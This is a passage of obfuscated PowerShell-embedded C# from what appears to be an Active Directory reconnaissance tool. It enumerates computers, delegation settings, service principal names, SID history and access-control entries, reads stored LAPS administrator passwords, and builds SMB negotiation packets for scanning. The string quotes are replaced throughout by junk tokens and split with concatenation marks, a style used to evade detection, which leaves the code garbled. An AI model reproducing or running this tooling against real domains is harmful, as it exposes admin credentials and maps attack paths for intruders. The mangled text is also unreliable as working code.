                        SOMObj.Members.Add(new PSNoteProperty(lEzjgPOptionslEzj, (AdSOM.Properties[lEzjgpoptionslEzj].Count != 0 ? AdSOM.Properties[lEzjgpoptionslEzj][0] : lEzjlEzj)));
                        SOMsList.Add( SOMObj );
                        Order--;
                    }
                    return SOMsList.ToArray();
                }
                catch (Exception e)
                {
                    Console.WriteLine(lEzjException caught: {0}lEzj, e);
                    return new PSObject[] { };
                }
            }
        }

        class PrinterRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    SearchResult AdPrinter = (SearchResult) record;

                    PSObject PrinterObj = new PSObject();
                    PrinterObj.Members.Add(new PSNoteProperty(lEzjNamelEzj, AdPrinter.Properties[lEzjNamelEzj][0]));
                    PrinterObj.Members.Add(new PSNoteProperty(lEzjServerNamelEzj, AdPrinter.Properties[lEzjserverNamelEzj][0]));
                    PrinterObj.Members.Add(new PSNoteProperty(lEzjShareNamelEzj, AdPrinter.Properties[lEzjprintShareNamelEzj][0]));
                    PrinterObj.Members.Add(new PSNoteProperty(lEzjDriverNamelEzj, AdPrinter.Properties[lEzjdriverNamelEzj][0]));
                    PrinterObj.Members.Add(new PSNoteProperty(lEzjDriverVersionlEzj, AdPrinter.Properties[lEzjdriverVersionlEzj][0]));
                    PrinterObj.Members.Add(new PSNoteProperty(lEzjPortNamelEzj, AdPrinter.Properties[lEzjportNamelEzj][0]));
                    PrinterObj.Members.A'+'dd(new PSNoteProperty(lEzjURLlEzj, AdPrinter.Properties[lEzjurllEzj][0]));
                    PrinterObj.Members.Add(new PSNoteProperty(lEzjwhenCreatedlEzj, AdPrinter.Properties[lEzjwhenCreatedlEzj][0]));
                    PrinterObj.Members.Add(new PSNoteProperty(lEzjwhenChangedlEzj, AdPrinter.Properties[lEzjwhenChangedlEzj][0]));
                    return new PSObject[] { PrinterObj };
                }
                catch (Exception e)
                {
                    Console.WriteLine(lEzjException caught: {0}lEzj, e);
                    return new PSObject[] { };
                }
            }
        }

        class ComputerRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    SearchResult AdComputer = (SearchResult) record;
                    bool Dormant = false;
                    bool? Enabled = null;
                    bool PasswordNotChangedafterMaxAge = false;
                    bool? TrustedforDelegation = null;
                    bool? TrustedtoAuthforDelegation = null;
                    string DelegationType = null;
                    string DelegationProtocol = null;
                    string DelegationServices = null;
                    string StrIPAddress = null;
                    int? DaysSinceLastLogon = null;
                    int? DaysSinceLastPasswordChange = null;
                    DateTime? LastLogonDate = null;
                    DateTime? PasswordLastSet = null;

                    if (AdComputer.Properties[lEzjdnshostnamelEzj].Count != 0)
                    {
                        try
                        {
                            StrIPAddress = Convert.ToString(Dns.GetHostEntry(Convert.ToString(AdComputer.Properties[lEzjdnshostnamelEzj][0])).AddressList[0]);
                        }
                        catch
                        {
                            StrIPAddress = null;
                        }
                    }
                    // When the user is not allowed to query the UserAccountControl attribute.
                    if (AdComputer.Properties[lEzjuseraccountcontrollEzj].Count != 0)
                    {
                        var userFlags = (UACFlags) AdComputer.Properties[lEzjuseraccountcontrollEzj][0];
                        Enabled = !((userFlags & UACFlags.ACCOUNTDISABLE) == UACFlags.ACCOUNTDISABLE);
                        TrustedforDelegation = (userFlags & UACFlags.TRUSTED_FOR_DELEGATION) == UACFlags.TRUSTED_FOR_DELEGATION;
                        TrustedtoAuthforDelegation = (userFlags & UACFlags.TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION) == UACFlags.TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION;
                  '+'  }
                    if (AdComputer.Properties[lEzjlastlogontimestamplEzj].Count != 0)
                    {
                        LastLogonDate = DateTime.FromFileTime((long)(AdComputer.Properties[lEzjlastlogontimestamplEzj][0]));
                        DaysSinceLastLogon = Math.Abs((Date'+'1 - (DateTime)LastLogonDate).Days);
                        if (DaysSinceLastLogon > DormantTimeSpan)
                        {
                            Dormant = true;
                        }
                    }
                    if (AdComputer.Properties[lEzjpwdlastsetlEzj].Count != 0)
                    {
                        PasswordLastSet = DateTime.FromFileTime((long)(AdComputer.Properties[lEzjpwdlastsetlEzj][0]));
                        DaysSinceLastPasswordChange = Math.Abs((Date1 - (DateTime)PasswordLastSet).Days);
                        if (DaysSinceLastPasswordChange > PassMaxAge)
                        {
                            PasswordNotChangedafterMaxAge = true;
                        }
                    }
                    if ( ((bool) TrustedforDelegation) && ((int) AdComputer.Properties[lEzjprimarygroupidlEzj][0] == 515) )
                    {
                        DelegationType = lEzjUnconstrainedlEzj;
                        DelegationServices = lEzjAnylEzj;
                    }
                    if (AdComputer.Properties[lEzjmsDS-AllowedToDelegateTolEzj].Count >= 1)
                    {
                        DelegationType = lEzjConstrainedlEzj;
                        for (int i = 0; i < AdComputer.Properties[lEzjmsDS-AllowedToDelegateTolEzj].Count; i++)
                        {
                            var delegateto = AdComputer.Properties[lEzjmsDS-AllowedToDelegateTolEzj][i];
                            DelegationServices = DelegationServices + lEzj,lEzj + Convert.ToString(delegateto);
                        }
                        DelegationServices = DelegationServices.TrimStart(xfJ4,xfJ4);
                    }
                    if ((bool) TrustedtoAuthforDelegation)
                    {
                        DelegationProtocol = lEzjAnylEzj;
                    }
                    else if (DelegationType != null)
                    {
                        DelegationProtocol = lEzjKerberoslEzj;
                    }
                    string SIDHistory = lEzjlEzj;
                    if (AdComputer.Properties[lEzjsidhistorylEzj].Count >= 1)
                    {
                        string sids = lEzjlEzj;
                        for (int i = 0; i < AdComputer.Properties[lEzjsidhistorylEzj].Count; i++)
                        {
                            var history = AdComputer.Properties[lEzjsidhistorylEzj][i];
                            sids = sids + lEzj,lEzj + Convert.ToString(new SecurityIdentifier((byte[])history, 0));
                        }
                        SIDHistory = sids.TrimStart(xfJ4,xfJ4);
                    }
                    string OperatingSystem = CleanString((AdComputer.Properties[lEzjoperatingsystemlEzj].Count != 0 ? AdComputer.Properties[lEzjoperatingsystemlEzj][0] : lEzj-lEzj) + lEzj lEzj + (AdComputer.Properties[lEzjoperatingsystemhotfixlEzj].Count != 0 ? AdComputer.Properties[lEzjoperatingsystemhotfixlEzj][0] : lEzj lEzj) + lEzj lEzj + (AdComputer.Properties[lEzjoperatingsystemservicepacklEzj].Count != 0 ? AdComputer.Properties[lEzjoperatingsystemservicepacklEzj][0] : lEzj lEzj) + lEzj lEzj + (AdComputer.Properties[lEzjoperatingsystemversionlEzj].Count != 0 ? AdComputer.Properties[lEzjoperatingsystemversionlEzj][0] : lEzj lEzj));

                    PSObject ComputerObj = new PSObject();
                    ComputerObj.Members.Add(new PSNoteProperty(lEzjUserNamelEzj, (AdComputer.Properties[lEzjsamaccountnamelEzj].Count != 0 ? CleanString(AdComputer.Properties[lEzjsamaccountnamelEzj][0]) : lEzjlEzj)));
                    ComputerObj.Members.Add(new PSNoteProperty(lEzjNamelEzj, (AdComputer.Properties[lEzjnamelEzj].Count != 0 ? CleanString(AdComputer.Properties[lEzjnamelEzj][0]) : lEzjlEzj)));
                    ComputerObj.Members.Add(new PSNoteProperty(lEzjDNSHostNamelEzj, (AdComputer.Properties[lEzjdnshostnamelEzj].Count != 0 ? AdComputer.Properties[lEzjdnshostnamelEzj][0] : lEzjlEzj)));
                    ComputerObj.Members.Add(new PSNoteProperty(lEzjEnabledlEzj, Enabled));
                    ComputerObj.Members.Add(new PSNoteProperty(lEzjIPv4AddresslEzj, StrIPAddress));
                    ComputerObj.Members.Add(new PSNoteProperty(lEzjOperating SystemlEzj, OperatingSystem));
                    ComputerObj.Members.Add(new PSNoteProperty(lEzjLogon Age (days)lEzj, DaysSinceLastLogon));
                    ComputerObj.Members.Add(new PSNoteProperty(lEzjPassword Age (days)lEzj, DaysSinceLastPasswordChange));'+'
                    ComputerObj.Members.Add(new PSNoteProperty(lEzjDormant (> lEzj + DormantTimeSpan + lEzj days)lEzj, Dormant));
                    ComputerObj.Members.Add(new PSNoteProperty(lEzjPassword Age (> lEzj + PassMaxAge + lEzj days)lEzj, PasswordNotChangedafterMaxAge));
                    ComputerObj.Members.Add(new PSNoteProperty(lEzjDelegation TypelEzj, DelegationType));
                    ComputerObj.Members.Add(new PSNoteProperty(lEzjDelegation ProtocollEzj, DelegationProtocol));
                    ComputerObj.Members.Add(new PSNoteProperty(lEzjDelegation ServiceslEzj, DelegationServices));
                    ComputerObj.Members.Add(new PSNoteProperty(lEzjPrimary Group IDlEzj, (AdComputer.Properties[lEzjprimarygroupidlEzj].Count != 0 ? AdComputer.Properties[lEzjprimarygroupidlEzj][0] : lEzjlEzj)));
                    ComputerObj.Members.Add(new PSNoteProperty(lEzjSIDlEzj, Convert.ToString(new SecurityIdentifier((byte[])AdComputer.Properties[lEzjobjectSIDlEzj][0], 0))));
                    ComputerObj.Members.Add(new PSNoteProperty(lEzjSIDHistorylEzj, SIDHistory));
                    ComputerObj.Members.Add(new PSNoteProperty(lEzjDescriptionlEzj, (AdComputer.Properties[lEzjDescriptionlEzj].Count != 0 ? CleanString(AdComputer.Properties[lEzjDescriptionlEzj][0]) : lEzjlEzj)));
                    ComputerObj.Members.Add(new PSNoteProperty(lEzjms-ds-CreatorSidlEzj, (AdComputer.Properties[lEzjms-ds-CreatorSidlEzj].Count != 0 ? Convert.ToString(new SecurityIdentifier((byte[])AdComputer.Properties[lEzjms-ds-CreatorSidlEzj][0], 0)) : lEzjlEzj)));
                    ComputerObj.Members.Add(new PSNoteProperty(lEzjLast Logon DatelEzj, LastLogonDate));
                    ComputerObj.Members.Add(new PSNoteProperty(lEzjPassword LastSetlEzj, PasswordLastSet));
                    ComputerObj.Members.Add(new PSNoteProperty(lEzjUserAccountControllEzj, (AdComputer.Properties[lEzjuseraccountcontrollEzj].Count != 0 ? AdComputer.Properties[lEzjuseraccountcontrollEzj][0] : lEzjlEzj)));
                    ComputerObj.Members.Add(new PSNoteProperty(lEzjwhenCreatedlEzj, AdComputer.Properties[lEzjwhencreatedlEzj][0]));
                    ComputerObj.Members.Add(new PSNoteProperty(lEzjwhenChangedlEzj, AdComputer.Properties[lEzjwhenchangedlEzj][0]));
                    ComputerObj.Members.Add(new PSNoteProperty(lEzjDistinguished NamelEzj, AdComputer.Properties[lEzjdistinguishednamelEzj][0]));
                    return new PSObject[] { ComputerObj };
                }
                catch (Exception e)
                {
                    Console.WriteLine(lEzjException caught: {0}lEzj, e);
                    return new PSObject[] { };
                }
            }
        }

        class ComputerSPNRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    SearchResult AdComputer = (SearchResult) record;
                    if (AdComputer.Properties[lEzjserviceprincipalnamelEzj].Count == 0)
                    {
                        return new PSObject[] { };
                    }
                    List<PSObject> SPNList = new List<PSObject>();

                    foreach (string SPN in AdComputer.Properties[lEzjserviceprincipalnamelEzj])
                    {
                        string[] SPNArray = SPN.Split(xfJ4/xfJ4);
                        bool flag = true;
                        foreach (PSObject Obj in SPNList)
                        {
                            if ( (string) Obj.Members[lEzjServicelEzj].Value == SPNArray[0] )
                            {
                                Obj.Members[lEzjHostlEzj].Value = string.Join(lEzj,lEzj, (Obj.Members[lEzjHostlEzj].Value + lEzj,lEzj + SPNArray[1]).Split(xfJ4,xfJ4).Distinct().ToArray());
               '+'                 flag = false;
                            }
                        }
                        if (flag)
                        {
                            PSObject ComputerSPNObj = new PSObject();
                            ComputerSPNObj.Members.Add(new PSNoteProperty(lEzjUserNamelEzj, (AdComputer.Properties[lEzjsamaccountnamelEzj].Count != 0 ? CleanString(AdComputer.Properties[lEzjsamaccountnamelEzj][0]) : lEzjlEzj)));
                            ComputerSPNObj.Members.Add(new PSNoteProperty(lEzjNamelEzj, (AdComputer.Properties[lEzjnamelEzj].Count != 0 ? CleanString(AdComputer.Properties[lEzjnamelEzj][0]) : lEzjlEzj)));
                            ComputerSPNObj.Members.Add(new PSNoteProperty(lEzjServicelEzj, SPNArray[0]));
                            ComputerSPNObj.Members.Add(new PSNoteProperty(lEzjHostlEzj, SPNArray[1]));
                            SPNList.Add( ComputerSPNObj );
                        }
                    }
                    return SPNList.ToArray();
                }
                catch (Exception e)
                {
                    Console.WriteLine(lEzjException caught: {0}lEzj, e);
                    return new PSObject[] { };
                }
            }
        }

        class LAPSRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    SearchResult AdComputer = (SearchResult) record;
                    bool PasswordStored = false;
                    DateTime? CurrentExpiration = null;
                    if (AdComputer.Properties[lEzjms-mcs-admpwdexpirationtimelEzj].Count != 0)
                    {
                        CurrentExpiration = DateTime.FromFileTime((long)(AdComputer.Properties[lEzjms-mcs-admpwdexpirationtimelEzj][0]));
                        PasswordStored = true;
                    }
                    PSObject LAPSObj = new PSObject();
                    LAPSObj.Members.Add(new PSNoteProperty(lEzjHostnamelEzj, (AdComputer.Properties[lEzjdnshostnamelEzj].Count != 0 ? AdComputer.Properties[lEzjdnshostnamelEzj][0] : AdComputer.Properties[lEzjcnlEzj][0] )));
                    LAPSObj.Members.Add(new PSNoteProperty(lEzjStoredlEzj, PasswordStored));
                    LAPSObj.Members.Add(new PSNoteProperty(lEzjReadablelEzj, (AdComputer.Properties[lEzjms-mcs-admpwdlEzj].Count != 0 ? true : false)));
                    LAPSObj.Members.Add(new PSNoteProperty(lEzjPasswordlEzj, (AdComputer.Properties[lEzjms-mcs-admpwdlEzj].Count != 0 ? AdComputer.Properties[lEzjms-mcs-admpwdlEzj][0] : null)));
                    LAPSObj.Members.Add(new PSNoteProperty(lEzjExpirationlEzj, CurrentExpiration));
                    return new PSObject[] { LAPSObj };
                }
                catch (Exception e)
                {
                    Console.WriteLine(lEzjException caught: {0}lEzj, e);
                    return new PSObject[] { };
                }
            }
        }

        class SIDRecordDictionaryProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    SearchResult AdObject = (SearchResult) record;
                    switch (Convert.ToString(AdObject.Properties[lEzjobjectclasslEzj][AdObject.Properties[lEzjobjectclasslEzj].Count-1]))
                    {
                        case lEzjuserlEzj:
                        case lEzjcomputerlEzj:
                        case lEzjgrouplEzj:
                            LDAPClass.AdSIDDictionary.Add(Convert.ToString(new SecurityIdentifier((byte[])AdObject.Properties[lEzjobjectSIDlEzj][0], 0)), (Convert.ToString(AdObject.Properties[lEzjnamelEzj][0])));
                            break;
                    }
                    return new PSObject[] { };
                }
                catch (Exception e)
                {
                    Console.WriteLine(lEzjException caught: {0}lEzj, e);
                    return new PSObject[] { };
                }
            }
        }

        class DACLRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    SearchResult AdObject = (SearchResult) record;
                    byte[] ntSecurityDescriptor = null;
                    string Name = null;
                    string Type = null;
                    List<PSObject> DACLList = new List<PSObject>();

                    Name = Convert.ToString(AdObject.Properties[lEzjnamelEzj][0]);

                    switch (Convert.ToString(AdObject.Properties[lEzjobjectclasslEzj][AdObject.Properties[lEzjobjectclasslEzj].Count-1]))
                    {
                        case lEzjuserlEzj:
      '+'                      Type = lEzjUserlEzj;
                            break;
                        case lEzjcomputerlEzj:
                            Type = lEzjComputerlEzj;
                            break;
                        case lEzjgrouplEzj:
                            Type = lEzjGrouplEzj;
                            break;
                        case lEzjcontainerlEzj:
                            Type = lEzjContainerlEzj;
                            break;
                        case lEzjgroupPolicyContainerlEzj:
                            Type = lEzjGPOlEzj;
                            Name = Convert.ToString(AdObject.Properties[lEzjdisplaynamelEzj][0]);
                            break;
                        case lEzjorganizationalUnitlEzj:
                            Type = lEzjOUlEzj;
                            break;
                        case lEzjdomainDNSlEzj:
                            Type = lEzjDomainlEzj;
                            break;
                        default:
                            Type = Convert.ToString(AdObject.Properties[lEzjobjectclasslEzj][AdObject.Prop'+'erties[lEzjobjectclasslEzj].Count-1]);
                            break;
                    }

                    // When the user is not allowed to query the ntsecuritydescriptor attribute.
                    if (AdObject.Properties[lEzjntsecuritydescriptorlEzj].Count != 0)
                    {
                        ntSecurityDescriptor = (byte[]) AdObject.Properties[lEzjntsecuritydescriptorlEzj][0];
                    }
                    else
                    {
                        DirectoryEntry AdObjectEntry = ((SearchResult)record).GetDirectoryEntry();
                        ntSecurityDescriptor = (byte[]) AdObjectEntry.ObjectSecurity.GetSecurityDescriptorBinaryForm();
                    }
                    if (ntSecurityDescriptor != null)
                    {
                        DirectoryObjectSecu'+'rity DirObjSec = new ActiveDirectorySecurity();
               '+'         DirObjSec.SetSecurityDescriptorBinaryForm(ntSecurityDescriptor);
                        AuthorizationRuleCollection AccessRules = (AuthorizationRuleCollection) DirObjSec.GetAccessRules(true,true,typeof(System.Security.Principal.NTAccount));
                        foreach (ActiveDirectoryAccessRule Rule in AccessRules)
                        {
                            string IdentityReference = Convert.ToString(Rule.IdentityReference);
                            string Owner = Convert.ToString(DirObjSec.GetOwner(typeof(System.Security.Principal.SecurityIdentifier)));
                            PSObject ObjectObj = new PSObject();
                            ObjectObj.Members.Add(new PSNoteProperty(lEzjNamelEzj, CleanString(Name)));
                            ObjectObj.Members.Add(new PSNoteProperty(lEzjTypelEzj, Type));
                            ObjectObj.Members.Add(new PSNoteProperty(lEzjObjectTypeNamelEzj, LDAPClass.GUIDs[Convert.ToString(Rule.ObjectType)]));
                            ObjectObj.Members.Add(new PSNoteProperty(lEzjInheritedObjectTypeNamelEzj, LDAPClass.GUIDs[Convert.ToString(Rule.InheritedObjectType)]));
                            ObjectObj.Members.Add(new PSNoteProperty(lEzjActiveDirectoryRightslEzj, Rule.ActiveDirectoryRights));
                            ObjectObj.Members.Add(new PSNoteProperty(lEzjAccessControlTypelEzj, Rule.Acce'+'ssControlType));
                            ObjectObj.Members.Add(new PSNoteProperty(lEzjIdentityReferenceNamelEzj, LDAPClass.AdSIDDictionary.ContainsKey(IdentityReference) ? LDAPClass.AdSIDDictionary[IdentityReference] : Iden'+'tityReference));
                            ObjectObj.Members.Add(new PSNoteProperty(lEzjOwnerNamelEzj, LDAPClass.AdSIDDictionary.ContainsKey(Owner) ?'+' LDAPClass.AdSIDDictionary[Owner] : Owner));
                            ObjectObj.Members.Add(new PSNoteProperty(lEzjInheritedlEzj, Rule.IsInherited));
                            ObjectObj.Members.Add(new PSNoteProperty(lEzjObjectFlagslEzj, Rule.ObjectFlags));
                            ObjectObj.Members.Add(new PSNoteProperty(lEzjInheritanceFlagslEzj, Rule.InheritanceFlags));
                            ObjectObj.Members.Add(new PSNoteProperty(lEzjInheritanceTypelEzj, Rule.InheritanceType));
                            ObjectObj.Members.Add(new PSNoteProperty(lEzjPropagationFlagslEzj, Rule.PropagationFlags));
                            ObjectObj.Members.Add(new PSNoteProperty(lEzjObjectTypelEzj, Rule.ObjectType));
                            ObjectObj.Members.Add(new PSNoteProperty(lEzjInheritedObjectTypelEzj, Rule.InheritedObjectType));
                            ObjectObj.Members.Add(new PSNoteProperty(lEzjIdentityReferencelEzj, Rule.IdentityReference));
                            ObjectObj.Members.Add(new PSNoteProperty(lEzjOwnerlEzj, Owner));
                            ObjectObj'+'.Members.Add(new PSNoteProperty(lEzjDistinguishedNamelEzj, AdObject.Properties[lEzjdistinguishednamelEzj][0]));
                            DACLList.Add( ObjectObj );
                        }
                    }

                    return DACLList.ToArray();
                }
                catch (Exception e)
                {
                    Console.WriteLine(lEzjException caught: {0}lEzj, e);
                    return new PSObject[] { };
                }
            }
        }

    class SACLRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    SearchResult AdObject = (SearchResult) record;
                    byte[] ntSecurityDescriptor = null;
                    string Name = null;
                    string Type = null;
                    List<PSObject> SACLList = new List<PSObject>();

                    Name = Convert.ToString(AdObject.Properties[lEzjnamelEzj][0]);

                    switch (Convert.ToString(AdObject.Pr'+'operties[lEzjobjectclasslEzj][AdObject.Properties[lEzjobjectclasslEzj].Count-1]))
                    {
                        case lEzjuserlEzj:
                            Type = lEzjUserlEzj;
                            break;
                        case lEzjcomputerlEzj:
                            Type = lEzjComputerlEzj;
                            break;
                        case lEzjgrouplEzj:
                            Type = lEzjGrouplEzj;
                            break;
                        case lEzjcontainerlEzj:
                            Type = lEzjContainerlEzj;
                            break;
                        case lEzjgroupPolicyContainerlEzj:
                            Type = lEzjGPOlEzj;
                            Name = Convert.ToString(AdObject.Properties[lEzjdisplaynamelEzj][0]);
                            break;
                        case lEzjorganizationalUnitlEzj:
                            Type = lEzjOUlEzj;
                            break;
                        case lEzjdomainDNSlEzj:
                            Type = lEzjDomainlEzj;
                            break;
                        default:
                            Type = Convert.ToString(AdObject.Properties[lEzjobjectclasslEzj][AdObject.Properties[lEzjobjectclasslEzj].Count-1]);
                            break;
                    }

                    // When the user is not allowed to query the ntsecuritydescriptor attribute.
                    if (AdObject.Properties[lEzjntsecuritydescriptorlEzj].Count != 0)
                    {
                        ntSecurityDescriptor = (byte[]) AdObject.Properties[lEzjntsecuritydescriptorlEzj][0];
                    }
                    else
                    {
                        DirectoryEntry AdObjectEntry = ((SearchResult)record).GetDirectoryEntry();
                        ntSecurityDescriptor = (byte[]) AdObjectEntry.ObjectSecurity.GetSecurityDescriptorBinaryForm();
                    }
                    if (ntSecurityDescriptor != null)
                    {
                        DirectoryObjectSecurity DirObjSec = new ActiveDirectorySecurity();
                        DirObjSec.SetSecurityDescriptorBinaryForm(ntSecurityDescriptor);
                        AuthorizationRuleCollection AuditRules = (AuthorizationRuleCollection) DirObjSec.GetAuditRules(true,true,typeof(System.Security.Principal.NTAccount));
                        foreach (ActiveDirectoryAuditRule Rule in AuditRules)
                        {
                            string IdentityReference = Convert.ToString(Rule.IdentityReference);
                            PSObject ObjectObj = new PSObject();
                            ObjectObj.Members.Add(new PSNoteProperty(lEzjNamelEzj, CleanString(Name)));
                            ObjectObj.Members.Add(new PSNoteProperty(lEzjTypelEzj, Type));
                            ObjectObj.Members.Add(new PSNoteProperty(lEzjObjectTypeNamelEzj, LDAPClass.GUIDs[Convert.ToString(Rule.ObjectType)]));
                            ObjectObj.Members.Add(new PSNoteProperty(lEzjInheritedObjectTypeNamelEzj, LDAPClass.GUIDs[Convert.ToString(Rule.InheritedObjectType)]));
                            ObjectObj.Members.Add(new PSNoteProperty(lEzjActiveDirectoryRightslEzj, Rule.ActiveDirectoryRights));
                            Objec'+'tObj.Members.Add(new PSNoteProperty(lEzjIdentityReferenceNamelEzj, LDAPClass.AdSIDDictionary.ContainsKey(IdentityReference) ? LDAPClass.AdSIDDictionary[IdentityReference] : IdentityReference));
                            ObjectObj.Members.Add(new PSNoteProperty(lEzjAuditFlagslEzj, Rule.AuditFlags));
                            ObjectObj.Members.Add(new PSNoteProperty(lEzjObjectFlagslEzj, Rule.ObjectFlags));
                            ObjectObj.Members.Add(new PSNoteProperty(lEzjInheritanceFlagslEzj, Rule.InheritanceFlags));
                            ObjectObj.Members.Add(new PSNoteProperty(lEzjInheritanceTypelEzj, Rule.InheritanceType));
                            ObjectObj.Members.Add(new PSNoteProperty(lEzjInheritedlEzj, Rule.IsInherited));
                            ObjectObj.Members.Add(new PSNoteProperty(lEzjPropagationFlagslEzj, Rule.PropagationFlags));
                            ObjectObj.Members.Add(new PSNoteProperty(lEzjObjectTypelEzj, Rule.ObjectType));
                            ObjectObj.Members.Add(new PSNoteProperty(lEzjInheritedObjectTypelEzj, Rule.InheritedObjectType));
                            ObjectObj.Members.Add(new PSNoteProperty(lEzjIdentityReferencelEzj, Rule.IdentityReference));
                            SACLList.Add( ObjectObj );
                        }
                    }

                    return SACLList.ToArray();
                }
                catch (Exception e)
                {
                    Console.WriteLine(lEzjException caught: {0}lEzj, e);
                    return new PSObject[] { };
                }
            }
        }

        //The interface and implmentation class used to handle the results (this implementation just writes the strings to a file)

        interface IResultsHandler
        {
            void processResults(Object[] t);

            Object[] finalise();
        }

        class SimpleResultsHandler : IResultsHandler
        {
            private Object lockObj = new Object();
            private List<Object> processed = new List<Object>();

            public SimpleResultsHandl'+'er()
            {
            }

            public void processResults(Object[] results)
            {
                lock (lockObj)
                {
                    if (results.Length != 0)
                    {
                        for (var i = 0; i < results.Length; i++)
                        {
                            processed.Add((PSObject)results[i]);
                        }
                    }
                }
            }

            public Object[] finalise()
            {
                return processed.ToArray();
            }
        }
lEzj@

# modified version from https://github.com/vletoux/SmbScanner/blob/master/smbscanner.ps1
bLHPingCastleSMBScannerSource = @lEzj

        [StructLayout(LayoutKind.Explicit)]
		struct SMB_Header {
			[FieldOffset(0)]
			public UInt32 Protocol;
			[FieldOffset(4)]
			public byte Command;
			[FieldOffset(5)]
			public int Status;
			[FieldOffset(9)]
			'+'public byte  Flags;
			[FieldOffset(10)]
			public UInt16 Flags2;
			[FieldOffset(12)]
			public UInt16 PIDHigh;
			[FieldOffset(14)]
			public UInt64 SecurityFeatures;
			[FieldOffset(22)]
			public UInt16 Reserved;
			[FieldOffset(24)]
			public UInt16 TID;
			[FieldOffset(26)]
			public UInt16 PIDLow;
			[FieldOffset(28)]
			public UInt16 UID;
			[FieldOffset(30)]
			public UInt16 MID;
		};
		// https://msdn.microsoft.com/en-us/library/cc246529.aspx
		[StructLayout(LayoutKind.Explicit)]
		struct SMB2_Header {
			[FieldOffset(0)]
			public UInt32 ProtocolId;
			[FieldOffset(4)]
			public UInt16 StructureSize;
			[FieldOffset(6)'+']
			public UInt16 CreditCharge;
			[FieldOffset(8)]
			public UInt32 Status; // to do SMB3
			[FieldOffset(12)]
			public UInt16 Command;
			[FieldOffset(14)]
			public UInt16 CreditRequest_Response;
			[FieldOffset(16)]
			public UInt32 Flags;
			[FieldOffset(20)]
			public UInt32 NextCommand;
			[FieldOffset(24)]
			public UInt64 MessageId;
			[FieldOffset(32)]
			public UInt32 Reserved;
			[FieldOffset(36)]
			public UInt32 TreeId;
			[FieldOffset(40)]
			public UInt64 SessionId;
			[FieldOffset(48)]
			public UInt64 Signature1;
			[FieldOffset(56)]
			public UInt64 Signature2;
		}
        [StructLayout(LayoutKind.Explicit)]
		struct SMB2_NegotiateRequest
		{
			[FieldOffset(0)]
			public UInt16 StructureSize;
			[FieldOffset(2)]
			public UInt16 DialectCount;
			[FieldOffset(4)]
			public UInt16 SecurityMode;
			[FieldOffset(6)]
			public UInt16 Reserved;
			[FieldOffset(8)]
			public UInt32 Capabilities;
			[FieldOffset(12)]
			public Guid ClientGuid;
			[FieldOffset(28)]
			public UInt64 ClientStartTime;
			[FieldOffset(36)]
			public UInt16 DialectToTest;
		}
		const int SMB_COM_NEGOTIATE'+'	= 0x72;
		const int SMB2_NEGOTIATE = 0;
		const int SMB_FLAGS_CASE_INSENSITIVE = 0x08;
		const int SMB_FLAGS_CANONICALIZED_PATHS = 0x10;
		const int SMB_FLAGS2_LONG_NAMES					= 0x0001;
		const int SMB_FLAGS2_EAS							= 0x0002;
		const int SMB_FLAGS2_SECURITY_SIGNATURE_REQUIRED	= 0x0010	;
		const int SMB_FLAGS2_IS_LONG_NAME					= 0x0040;
		const int SMB_FLAGS2_ESS							= 0x0800;
		const int SMB_FLAGS2_NT_STATUS					= 0x4000;
		const int SMB_FLAGS2_UNICODE						= 0x8000;
		const int SMB_DB_FORMAT_DIALECT = 0x02;
		static byte[] GenerateSmbHeaderFromCommand(byte command)
		{
			SMB_Header header = new SMB_Header();
			header.Protocol = 0x424D53FF;
			header.Command = command;
			header.Status = 0;
			header.Flags = SMB_FLAGS_CASE_INSENSITIVE 0Ogv SMB_FLAGS_CANONICALIZED_PATHS;
			header.Flags2 = SMB_FLAGS2_LONG_NAMES 0Ogv SMB_FLAGS2_EAS 0Ogv SMB_FLAGS2_SECURITY_SIGNATURE_REQUIRED 0Ogv'+' SMB_FLAGS2_IS_LONG_NAME 0Ogv SMB_FLAGS2_ESS 0Ogv SMB_FLAGS2_NT_STATUS 0Ogv SMB_FLAGS2_UNICODE;
			header.PIDHigh = 0;
			header.SecurityFeatures = 0;
			header.Reserved = 0;
			header.TID = 0xffff;
			header.PIDLow = 0xFEFF;
			header.UID = 0;
			header.MID = 0;
			return getBytes(header);
		}
		static byte[] GenerateSmb2HeaderFromCommand(byte command)
		{
			SMB2_Header header = new SMB2_Header();
			header.ProtocolId = 0x424D53FE;
			header.Command = command;
			header.StructureSize = 64;
			header.Command = command;
			header.MessageId = 0;
			header.Reserved = 0xFEFF;
			return getBytes(header);
		}
		static byte[] getBytes(object structure)
		{
			int size = Marshal.SizeOf(structure);
			byte[] arr = new byte[size];
			IntPtr ptr = Marshal.AllocHGlobal(size);
			Marshal.StructureToPtr(structure, ptr, true);
			Marshal.Copy(ptr, arr, 0, size);
			Marshal.FreeHGlobal(ptr);
			return arr;
		}
		static byte[] getDialect(string dialect)
		{
			byte[] dialectBytes = Encoding.ASCII.GetBytes(dialect);
			byte[] output = new byte[dialectBytes.Length + 2];
			output[0] = 2;
			output[output.Length - 1] = 0;
			Array.Copy(dialectBytes, 0, output, 1, dialectBytes.Length);
			return output;
		}
		static byte[] GetNegotiateMessage(byte[] dialect)
		{
			byte[] output = new byte[dialect.Length + 3];
			output[0] = 0;
			output[1] = (byte) dialect.Length;
			output[2] = 0;
			Array.Copy(dialect, 0, output, 3, dialect.Length);
			return output;
		}
		// MS-SMB2  2.2.3 SMB2 NEGOTIATE Request
		static byte[] GetNegotiateMessageSmbv2(int DialectToTest)
		{
			SMB2_NegotiateRequest request = new SMB2_NegotiateRequest();
			request.StructureSize '+'= 36;
			request.DialectCount = 1;
			request.SecurityMode = 1; // signing enabled
			request.ClientGuid = Guid.NewGuid();
			request.DialectToTest = (UInt16) DialectToTest;
			return getBytes(request);
		}
		static byte[] GetNegotiatePacket(byte[] header, byte[] smbPacket)
		{
			byte[] output = new byte[smbPacket.Length + header.Length + 4];
			output[0] = 0;
			output[1] = 0;
			output[2] = 0;
